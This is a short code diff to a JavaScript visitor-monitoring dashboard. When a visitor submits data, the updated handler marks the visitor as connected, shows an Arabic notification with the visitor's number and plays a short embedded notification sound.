@@ -153,12 +153,22 @@
       });
 
       socket.on('visitor:dataSubmitted', ({ visitorId, data, visitor }) => {
+        // Ensure visitor is marked as connected and update data
+        visitor.isConnected = true;
         visitors.set(visitorId, visitor);
         renderVisitorsList();
+        // Always update details if this visitor is selected
         if (selectedVisitorId === visitorId) {
           renderVisitorDetails(visitor);
         }
-        showNotification('بيانات جديدة من الزائر ' + visitor.visitorNumber);
+        // Show notification with sound
+        showNotification('📝 بيانات جديدة من الزائر #' + visitor.visitorNumber);
+        // Play notification sound
+        try {
+          const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2teleQAAAAAAAAAAAA==');
+          audio.volume = 0.5;
+          audio.play().catch(() => {});
+        } catch(e) {}
       });
 
       socket.on('visitor:disconnected', ({ visitorId, socketId }) => {
